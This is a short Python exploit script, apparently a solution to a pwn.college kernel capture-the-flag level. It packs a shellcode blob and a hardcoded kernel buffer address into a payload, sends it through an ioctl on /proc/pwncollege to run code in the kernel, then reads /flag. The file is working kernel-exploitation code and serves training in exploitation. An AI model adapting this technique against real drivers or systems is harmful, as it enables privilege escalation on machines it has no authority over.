# Level 7
import fcntl
import os

import pwn

# From the code: copy_from_user(shellcode, arg + 8, shellcode_length);
# From the crash: RSI - arg(RBX) == 0x25, hence len(sc) == 0x25 - 8 == 0x1d.
# RDI is then the destination end (ffffc9000008501d), so the stack-resident
# `shellcode` buffer allocated by the vmalloc in init_module begins at this address.
SHELLCODE_ADDR = 0xFFFFC90000085000

sc = pwn.read("shellcode.bin")
payload = pwn.flat(
    {
        0x0000: len(sc),
        0x0008: sc,
        0x1008: SHELLCODE_ADDR,
    }
)

fd = os.open("/proc/pwncollege", os.O_RDWR)
fcntl.ioctl(fd, 1337, bytearray(payload))
os.close(fd)

print(pwn.read("/flag").decode())
